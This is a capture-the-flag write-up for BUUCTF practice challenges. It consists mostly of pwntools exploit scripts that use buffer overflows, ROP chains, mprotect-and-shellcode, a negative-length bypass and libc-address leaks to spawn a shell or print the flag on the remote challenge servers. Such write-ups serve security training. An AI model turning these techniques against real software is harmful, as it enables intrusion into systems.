# # buuctf wp part5

## not_the_same_3dsctf_2016

```python
    from pwn import *
    context.arch = 'i386'

    # p = process('./not_the_same')
    p = remote('node3.buuoj.cn',27317)
    elf = ELF('./not_the_same')

    def exp1(p,elf):
        shellcode_addr = 0x080EA000
        payload = 0x2d*'A'  # the padding need to debug
        payload += flat([elf.sym['mprotect'], elf.sym['main'], shellcode_addr, 0x80, 0x7])
        p.sendline(payload)
        # change the policy of shellcode_addr, and write shellcode to execve
        payload = 0x2d*'A'
        payload += flat([elf.sym['gets'], shellcode_addr, shellcode_addr])
        # after get shellcode to shellcode_addr, return to shellcode_addr and execve the shellcode
        p.sendline(payload)
        sleep(1)
        p.sendline(asm(shellcraft.sh()))
        sleep(1)
        p.interactive()

    def exp2(p,elf):
        # when debug locally, exp2 is not effectively
        fl4g = 0x080ECA2D
        payload = 'A'*0x2d
        payload += flat([elf.sym['get_secret'], elf.sym['write'], elf.sym['main'], 0, fl4g, 50])
        # execve function get_secret, and print the flag by function write
        p.sendline(payload)
        sleep(1)
        print p.recv()

    res = input('exp1(f) or exp2(s): ')
    if res == 'f':
        exp1(p,elf)
    elif res == 's':
        exp2(p,elf)
    else:
        print "Wrong input!"
```

## pwn1_sctf_2016

```python
from pwn import *

# the max input length was limit by 32,
# but padding to make overflow need 0x3c+0x4 characters,
# but if our input is 'I', the program will replace 'I' to 'you',
# so we just need input (0x3c+0x4)/3 'I' and 1 'a'(or any character except 'I')

context.arch = 'i386'

# p= process('./pwn1_sctf_2016')
p = remote('node3.buuoj.cn',26328)

payload = 'I'*((0x3c+0x4)//3) + 'A' + p32(ELF('./pwn1_sctf_2016').sym['get_flag'])
p.sendline(payload)
print p.recv()
```

## pwn2_sctf_2016

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./pwn2')
p = remote('node3.buuoj.cn',27048)
elf = ELF('./pwn2')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
# pass the judgement 'if ( v2 > 32 )',
# the function of get_n gets a number which class is unsigned int,
# so just input a negative like '-1',
# it could pass the judgement and will be transffer to 0xff by system,
# so, we can change the input length by this way
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+4)
# payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['printf']])
payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['__libc_start_main']])
p.sendline(payload)
p.recvuntil('\n')
# leak the libc address to get shell

# printf_addr = u32(p.recv(4).ljust(4,'\x00'))
# log.success('printf_addr = %#x',printf_addr)

main_addr = u32(p.recv(4).ljust(4,'\x00'))
log.success('main = %#x',main_addr)

# system_addr = printf_addr - (libc.sym['printf'] - libc.sym['system'])
# binsh = printf_addr - (libc.sym['printf'] - next(libc.search('/bin/sh')))

# libc = LibcSearcher('printf',printf_addr)
# libc_base = printf_addr - libc.dump('printf')
libc = LibcSearcher('__libc_start_main',main_addr)
libc_base = main_addr - libc.dump('__libc_start_main')
# system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
# log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))
execve_addr = libc_base + libc.dump('execve')
log.info('execve_addr = %#x, binsh = %#x'%(execve_addr,binsh))

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+0x4)
# payload += flat([system_addr, elf.sym['main'], binsh])
payload += flat([execve_addr, elf.sym['main'], binsh, 0, 0])
p.sendline(payload)
# sleep(1)
p.interactive()

# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
```

## rip

```python
from pwn import *

context.arch = 'amd64'

# p = process('./pwn1')
p = remote('node3.buuoj.cn',28245)

payload = 'a'*(0xf+0x8) # padding
payload += p64(0x401016) + p64(0x401186)    # retn to function of fun,ret = 0x401016

p.send(payload)
p.interactive()
```

## warmup_csaw_2016

```python
from pwn import *
context.arch = 'amd64'

p = process('./warmup_csaw_2016')
p = remote('node3.buuoj.cn',26357)

p.recvuntil('WOW:')
func_flag = int(p.recvuntil('\n>')[:-2],16)
log.info('func_flag = %#x',func_flag)

payload = 'a'*(0x40+8) + p64(func_flag)
p.sendline(payload)
print p.recv()
```

## 铁人三项(第五赛区)_2018_rop

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'
# just leak the libc, and get shell

# p = process('./rop')
p = remote('node3.buuoj.cn',28307)
elf = ELF('./rop',checksec=False)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
ret = 0x08048199 # ret

payload = 'A'*(0x88+4)
# payload += flat([write_plt, main, 1, write_got, 4])
payload += flat([ret, write_plt, main, 1, write_got, 4])
p.send(payload)
write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

paylaod = "a"*(0x88+4)
# paylaod += flat([system_addr, main, binsh])
paylaod += flat([ret, system_addr, main, binsh])
p.send(paylaod)
sleep(1)
p.interactive()
```
